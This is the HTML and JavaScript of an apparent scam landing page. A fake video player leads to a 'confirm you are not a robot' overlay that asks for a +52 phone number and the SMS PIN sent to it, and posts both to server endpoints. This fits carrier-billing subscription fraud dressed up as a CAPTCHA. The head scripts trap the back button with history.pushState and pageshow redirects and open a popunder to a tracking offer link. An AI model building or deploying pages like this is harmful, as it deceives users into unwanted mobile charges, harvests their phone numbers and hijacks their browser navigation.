<!DOCTYPE html>

<html>

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title id="a1">Attention!</title>
    <link rel="icon" href="/public/images/fav.png">
    <link href="/public/styles/618122e7088e8.css" rel="stylesheet">
    <script src="/public/javascript/jquery.min.js" charset="utf-8"></script>
  
    <link href="/public/styles/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
    <script>
            var offer_url = "https://ig2kv.bemobtrcks.com/go/345b4dd2-26bd-45a1-b593-8d458f4715c3&c1=popunder&c2=MX";
            var split_url = "https://www.luckforyou.win/api/loading.php?key=345b4dd2-26bd-45a1-b593-8d458f4715c3&c1=popunder&c2=MX";
        
            function go() {
                window.onbeforeunload = null;
                window.open(offer_url);
                setTimeout(function () {
                    document.location.assign(split_url);
                }, 1000);
            };
        </script>
        <script>
            window.addEventListener("pageshow", function (event) {
                (event.persisted || "back_forward" == performance.getEntriesByType("navigation")[0].type) && (window.location.href = "https://www.luckforyou.win/api/loading.php?key=345b4dd2-26bd-45a1-b593-8d458f4715c3&c1=BBR&c2=MX")
            });
        </script>
        <script>
        
            var bbURL = "https://www.luckforyou.win/api/loading.php?key=345b4dd2-26bd-45a1-b593-8d458f4715c3&c1=BBR&c2=MX";
        
            !function () {
                var a;
                try {
                    for (a = 0; 3 > a; ++a) {
                        history.pushState({}, "", "#")
                    }
                    onpopstate = function (c) {
                        c.state && location.replace(bbURL)
                    }
                } catch (b) { }
            }();
        </script>
    <script>
            function getURLParameter(name) {
                return decodeURIComponent(
                    (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
                );
            }
            strAlert = "";

            var translation = {
                source: {
                    a1: "Attention!",
                    a2: "Confirm that you are not a robot.",
                    errorMessage: "An error has occurred. Please try again.",
                    successMessage: "Verification code has been successfully sent!",
                    loading: "Your request is being processed...",
                    msisdn_placeholder: "Phone number (123-456-7890)",
                    pin_placeholder: "Enter 6-digit PIN",
                    sendPinBtn: "Send PIN",
                    verifyBtn: "Verify PIN"
                },
                en: {
                    a1: "Attention!",
                    a2: "Confirm that you are not a robot.",
                    errorMessage: "An error has occurred. Please try again.",
                    successMessage: "Verification code has been successfully sent!",
                    loading: "Your request is being processed...",
                    msisdn_placeholder: "Phone number (123-456-7890)",
                    pin_placeholder: "Enter 6-digit PIN",
                    sendPinBtn: "Send PIN",
                    verifyBtn: "Verify PIN"
                },
                de: {
                    a1: "Achtung!",
                    a2: "Stellen Sie sicher, dass Sie kein Roboter sind.",
                    errorMessage: "Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.",
                    successMessage: "Bestätigungscode wurde erfolgreich gesendet!",
                    loading: "Ihre Anfrage wird bearbeitet...",
                    msisdn_placeholder: "Telefonnummer (123-456-7890)",
                    pin_placeholder: "6-stellige PIN eingeben",
                    sendPinBtn: "PIN senden",
                    verifyBtn: "PIN überprüfen"
                },
                fr: {
                    a1: "Attention !",
                    a2: "Assurez-vous que vous n'êtes pas un robot.",
                    errorMessage: "Une erreur s'est produite. Veuillez réessayer.",
                    successMessage: "Le code de vérification a été envoyé avec succès!",
                    loading: "Votre demande est en cours de traitement...",
                    msisdn_placeholder: "Numéro de téléphone (123-456-7890)",
                    pin_placeholder: "Entrez le PIN à 6 chiffres",
                    sendPinBtn: "Envoyer le PIN",
                    verifyBtn: "Vérifier le PIN"
                },
                pt: {
                    a1: "Atenção!",
                    a2: "Certifique-se de que você não é um robô.",
                    errorMessage: "Ocorreu um erro. Por favor, tente novamente.",
                    successMessage: "Código de verificação enviado com sucesso!",
                    loading: "Sua solicitação está sendo processada...",
                    msisdn_placeholder: "Número de telefone (123-456-7890)",
                    pin_placeholder: "Digite o PIN de 6 dígitos",
                    sendPinBtn: "Enviar PIN",
                    verifyBtn: "Verificar PIN"
                },
                es: {
                    a1: "Atenção!",
                    a2: "Asegúrate de que no eres un robot.",
                    errorMessage: "Ha ocurrido un error. Por favor, inténtalo de nuevo.",
                    successMessage: "¡Código de verificación enviado con éxito!",
                    loading: "Su solicitud está siendo procesada...",
                    msisdn_placeholder: "Número de teléfono (123-456-7890)",
                    pin_placeholder: "Ingrese PIN de 6 dígitos",
                    sendPinBtn: "Enviar PIN",
                    verifyBtn: "Verificar PIN"
                },
                sr: {
                    a2: "Уверите се да нисте робот.",
                    errorMessage: "Дошло је до грешке. Молимо покушајте поново.",
                    successMessage: "Код за верификацију је успешно послат!",
                    loading: "Ваш захтев се обрађује...",
                    msisdn_placeholder: "Број телефона (123-456-7890)",
                    pin_placeholder: "Унесите 6-цифрени PIN",
                    sendPinBtn: "Пошаљи PIN",
                    verifyBtn: "Потврди PIN"
                },
                ar: {
                    a2: "تأكد من أنك لست روبوتًا.",
                    errorMessage: "حدث خطأ. يرجى المحاولة مرة أخرى.",
                    successMessage: "تم إرسال رمز التحقق بنجاح!",
                    loading: "طلبك قيد المعالجة...",
                    msisdn_placeholder: "رقم الهاتف (123-456-7890)",
                    pin_placeholder: "أدخل الرمز السري المكون من 6 أرقام",
                    sendPinBtn: "إرسال الرمز السري",
                    verifyBtn: "تحقق من الرمز السري"
                },
                nl: {
                    a2: "Zorg ervoor dat u geen robot bent.",
                    errorMessage: "Er is een fout opgetreden. Probeer het opnieuw.",
                    successMessage: "Verificatiecode is succesvol verzonden!",
                    loading: "Uw verzoek wordt verwerkt...",
                    msisdn_placeholder: "Telefoonnummer (123-456-7890)",
                    pin_placeholder: "Voer 6-cijferige PIN in",
                    sendPinBtn: "PIN verzenden",
                    verifyBtn: "PIN verifiëren"
                },
                zh: {
                    a1: "注意！",
                    a2: "请确认您不是机器人。",
                    errorMessage: "发生错误,请重试。",
                    successMessage: "验证码已成功发送！",
                    loading: "您的请求正在处理中...",
                    msisdn_placeholder: "电话号码 (123-456-7890)",
                    pin_placeholder: "输入6位PIN码",
                    sendPinBtn: "发送PIN码",
                    verifyBtn: "验证PIN码"
                },
                ms: {
                    a2: "Pastikan anda bukan robot.",
                    errorMessage: "Ralat telah berlaku. Sila cuba lagi.",
                    successMessage: "Kod pengesahan telah berjaya dihantar!",
                    loading: "Permintaan anda sedang diproses...",
                    msisdn_placeholder: "Nombor telefon (123-456-7890)",
                    pin_placeholder: "Masukkan PIN 6 digit",
                    sendPinBtn: "Hantar PIN",
                    verifyBtn: "Sahkan PIN"
                },
                id: {
                    a2: "Pastikan Anda bukan robot.",
                    errorMessage: "Terjadi kesalahan. Silakan coba lagi.",
                    successMessage: "Kode verifikasi berhasil dikirim!",
                    loading: "Permintaan Anda sedang diproses...",
                    msisdn_placeholder: "Nomor telepon (123-456-7890)",
                    pin_placeholder: "Masukkan PIN 6 digit",
                    sendPinBtn: "Kirim PIN",
                    verifyBtn: "Verifikasi PIN"
                },
                th: {
                    a2: "โปรดตรวจสอบว่าคุณไม่ใช่หุ่นยนต์",
                    errorMessage: "เกิดข้อผิดพลาด กรุณาลองอีกครั้ง",
                    successMessage: "ส่งรหัสยืนยันสำเร็จแล้ว!",
                    loading: "กำลังประมวลผลคำขอของคุณ...",
                    msisdn_placeholder: "หมายเลขโทรศัพท์ (123-456-7890)",
                    pin_placeholder: "ป้อน PIN 6 หลัก",
                    sendPinBtn: "ส่ง PIN",
                    verifyBtn: "ยืนยัน PIN"
                }
            
            };
            

            // 建立元素id和翻译键的映射
            var elementMapping = {
                'pin_placeholder': 'pin', // 翻译键pin_placeholder对应元素id为pin
                // 可以添加其他映射
                'msisdn_placeholder': 'msisdn',
            };

            function replace_text(lang, text) {
                var elementId = elementMapping[text] || text; // 如果有映射就用映射，否则用text作为id
                var x = document.getElementById(elementId);
                
                if (x) {
                    if (x.tagName === 'INPUT' || x.tagName === 'TEXTAREA') {
                        if (x.hasAttribute('placeholder')) {
                            x.setAttribute('placeholder', translation[lang][text]);
                            console.log("Translated placeholder for", elementId, "to", translation[lang][text]);
                        }
                    } else {
                        x.innerHTML = translation[lang][text];
                    }
                } else {
                    console.log("Element not found: " + elementId + " (translation key: " + text + ")");
                }
            }

            function alert_string(lang, text) {
                return translation[lang][text] + "\n\n";
            }

            function translation_available(lang) {
                if (translation[lang]) {
                    return lang;
                } else {
                    console.log("translation not Found: " + lang);
                    return "source";
                }
            }

            function detect_language() {
                var language = navigator.language || navigator.userLanguage;
                if (language.length > 4) {
                    language = language[0] + language[1];
                };
                if (jQuery.inArray(language, ['ar', 'he', 'fa', 'ur']) >= 0) {
                    $('.wrapper').attr('DIR', 'RTL');
                    $('.top_wrapper').css('text-align', 'right');
                    $('.button').css('padding', '0 20px 18px 20px')
                }
                return translation_available(language);
            }

            function translate() {
                var language = detect_language();
                for (y in translation["source"]) {
                    replace_text(language, y);
                    if (y == 'aler') {
                    strAlert += translation[language][y];
                    }
                }

            }

            function getURLParameter(name) {
                return decodeURI(
                    (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
                );
            }
        
            function translate() {
                var language = detect_language();
                
                // 单独处理pin输入框
                var pinInput = document.getElementById('pin');
                if (pinInput && translation[language] && translation[language]['pin_placeholder']) {
                    pinInput.setAttribute('placeholder', translation[language]['pin_placeholder']);
                }
                
                // 处理其他文本
                for (var y in translation["source"]) {
                    if (y !== 'pin_placeholder') { // 跳过已经单独处理的
                        replace_text(language, y);
                    }
                }
            }
        </script>

</head>

<body onload="translate();">
    <div class="mask hidden" id="mask">
    </div>        
    <div class="container" >
        
        <div class="container-pin hidden"  id="container">
              
            <h3 id="a2">Make sure that you are not a robot.</h3>             
            <br>

            <!-- 隐藏的 发送错误 信息 -->
            <div class="error-message" id="errorMessage" style="display: none;">
            An error has occurred. Please try again.
            </div>                
            <!-- 隐藏的 发送成功 信息 -->
            <div class="success-message" id="successMessage" style="display: none;">
            Verification code has been successfully sent!
            </div>               
            <!-- 隐藏的 loading -->
            <div class="loading" id="loading">
                <div class="loading-spinner"></div>
                <p>Your request is being processed...</p>
            </div>
            

            <form id="phoneForm">
                <!-- 1、手机号码输入框 -->
                <div class="form-group">                        
                    <div class="phone-input">
                        <span class="country-code">+52</span>
                        <input class="blink" type="text" name="msisdn" id="msisdn" placeholder="Phone number (123-456-7890)" required 
                               pattern="[0-9]{3} [0-9]{3} [0-9]{4}" title="123-456-7890">
                    </div>                       
                </div>
                <!-- 2、验证码输入框 + 发送验证码按钮 -->
                <div class="form-group">                   
                    <div class="pin-input-container-pin">
                        <input type="text" name="pin" id="pin" class="pin-input blink" placeholder="Enter 6-digit PIN" 
                               pattern="[0-9]{6}" title="6-digit PIN" maxlength="6" disabled>
                        <button type="submit" class="send-pin-btn" id="sendPinBtn">Send PIN</button>
                    </div>                       
                </div>             
            </form>
            

            <!-- 3、确认验证码按钮 -->
            <button type="click" class="btn" id="verifyBtn" disabled>Verify PIN</button>
        </div>
        
        <!-- 发送验证码及确认验证码JS -->
        <script> 
            // 点击‘发送验证码’按钮流程
            document.getElementById('phoneForm').addEventListener('submit', async function(e) {
                e.preventDefault();
                
                const input = document.getElementById('msisdn');
                const errorDiv = document.getElementById('errorMessage');
                const successDiv = document.getElementById('successMessage');
                const loadingDiv = document.getElementById('loading');
                const pinInput = document.getElementById('pin');
                const sendPinBtn = document.getElementById('sendPinBtn');
                const verifyBtn = document.getElementById('verifyBtn');
                
                // 隐藏 previous messages
                errorDiv.style.display = 'none';
                successDiv.style.display = 'none';
                
                // 简单的客户端验证
                if (!input.value.match(/^\d{3} \d{3} \d{4}$/)) {
                    errorDiv.textContent = 'Please fill out in the following format: 123-456-7890';
                    errorDiv.style.display = 'block';
                    return;
                }
                
                // 显示加载指示器
                loadingDiv.style.display = 'block';
                input.classList.remove('blink');
                try {
                    // 发送数据到服务器端处理
                    const formData = new FormData();
                    formData.append('msisdn', input.value);
                    
                    const response = await fetch('/api/api_handler2.php', {
                        method: 'POST',
                        body: formData
                    });
                    
                    const result = await response.json();
                    
                    if (result.status === 'success') {
                        successDiv.textContent = 'Verification code has been successfully sent!';
                        successDiv.style.display = 'block';
                        errorDiv.style.display = 'none';
                        
                        // 启用PIN输入和verify按钮
                        
                        pin.disabled = false;
                        verifyBtn.disabled = false;
                        
                        // 保存tracker（如果有）
                        if (result.tracker) {
                            window.tracker = result.tracker;
                        }
                        // 禁用按钮并开始倒计时
                        sendPinBtn.disabled = true;
                        let countdown = 120; // 120秒倒计时
                        
                        // 更新按钮文本
                        sendPinBtn.textContent = ` ${countdown}s`;
                        
                        // 设置倒计时间隔
                        const countdownInterval = setInterval(() => {
                            countdown--;
                            sendPinBtn.textContent = ` ${countdown}s`;
                            
                            if (countdown <= 0) {
                                clearInterval(countdownInterval);
                                sendPinBtn.disabled = false;
                                sendPinBtn.textContent = 'Send PIN';
                            }
                        }, 1000);
                        
                        
                    } 
                    else {
                        // 显示错误消息
                        errorDiv.style.display = 'block';
                    }
                }
                catch (error) {
                    // 处理网络错误
                    errorDiv.style.display = 'block';
                    console.error('Error:', error);
                } 
                finally {
                    // 无论成功或失败，都隐藏加载指示器
                    loadingDiv.style.display = 'none';
                }
            });
            
            // 格式化电话号码输入
            document.getElementById('msisdn').addEventListener('input', function(e) {
                // 移除所有非数字字符
                let value = e.target.value.replace(/\D/g, '');
                
                // 如果超过11位，截取前10位
                if (value.length > 10) {
                    value = value.substring(0, 10);
                }
                
                // 根据数字长度进行格式化
                let formattedValue = value;
                if (3 <value.length ) {
                    formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) ;
                }
                if (7 <= value.length ) {
                    formattedValue = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6, 10) ;
                }
                
                // 更新输入框的值
                e.target.value = formattedValue;
            });
                      
            // 验证PIN码按钮功能
            document.getElementById('verifyBtn').addEventListener('click', async function() {
                const pinInput = document.getElementById('pin');
                const errorDiv = document.getElementById('errorMessage');
                const successDiv = document.getElementById('successMessage');
                const loadingDiv = document.getElementById('loading');
                const containerDiv = document.getElementById('container');
                const maskDiv = document.getElementById('mask');
                const fourplayerDiv = document.getElementById('fourplayer');
               
                // 验证PIN码
                if (!pinInput.value.match(/^\d{6}$/)) {
                    errorDiv.style.display = 'block';
                    
                    return;
                }
                
                // 显示加载指示器
                loadingDiv.style.display = 'block';
                errorDiv.style.display = 'none';
                successDiv.style.display = 'none';
                pinInput.classList.remove('blink');
                try {
                    // 发送验证请求
                    const formData = new FormData();
                    formData.append('pin', pinInput.value);
                    formData.append('tracker', window.tracker || '');
                    
                    const response = await fetch('/api/verify2.php', {
                        method: 'POST',
                        body: formData
                    });
                    
                    const result = await response.json();
                    // 如果返回success,重新给successDiv的textContent赋值
                    if (result.status === 'success') {
                        successDiv.textContent = 'Verification successful!';
                        successDiv.style.display = 'block';
                        
                        // 如果服务器返回了重定向地址，设置一个2秒的延时，然后重定向用户到相应的页面。
                        if (result.redirect) {
                            setTimeout(() => {
                                window.location.href = result.redirect;
                            }, 2000);
                        }
                        // 没重定向将整个div隐藏，显示出下面的播放按钮，方便点击跳转
                        else{
                            setTimeout(() => {
                                containerDiv.classList.add('hidden');
                                maskDiv.classList.add('hidden');
                            }, 1000);   
                        }
                        fourplayerDiv.removeEventListener('click', ShowContainer);
                        fourplayerDiv.addEventListener('click', go);
                    } 
                    else {
                        errorDiv.textContent = 'Invalid verification code. Please try again.';
                        errorDiv.style.display = 'block';
                    }
                } catch (error) {
                    errorDiv.textContent = 'The verification code is incorrect. Please check your PIN and try again.';
                    errorDiv.style.display = 'block';
                    console.error('Error:', error);
                } finally {
                    loadingDiv.style.display = 'none';
                }
            });
        </script>
        
       
        
    </div>
    <script>
        function ShowContainer() {
            const containerDiv = document.getElementById('container');
            const maskDiv = document.getElementById('mask');

            containerDiv.classList.remove('hidden');
            maskDiv.classList.remove('hidden');

        }
    </script>  
    <div class="player" onclick="ShowContainer()" id="fourplayer">
        <div class="player_content">
            <img class="loading2" src="/public/images/618122e708794.svg" alt="">
            <img class="play" src="/public/images/618122e7087e9.svg" alt="">
        </div>
        <div class="top_icons">
        <img src="/public/images/close.svg"> <img src="/public/images/thumb.svg">
        
        </div>
        <div class="player_navigation">
            <div class="player_navigation_item">
                <div class="pause_play">
                    <img src="/public/images/618122e708859.svg" alt="">
                    <img src="/public/images/618122e708870.svg" alt="">
                </div>
                <p>00:0<span id="counter_wrapper">2</span>/1:52:46</p>
            </div>
            <div class="progress">
                <div class="progress_load">
                    <div class="progress_line"></div>
                </div>
            </div>
            <div class="player_navigation_item">
                <img src="/public/images/618122e708887.svg" alt="">
                <!-- <img class="img_padding" src="/public/images/618122e7088ca.svg" alt=""> -->
                <img src="/public/images/618122e70889d.svg" alt="">
                <img src="/public/images/618122e7088b2.svg" alt="">
                <img src="/public/images/618122e7088ca.svg" alt="">
            </div>
        </div>
    </div>   
    



</body>

</html>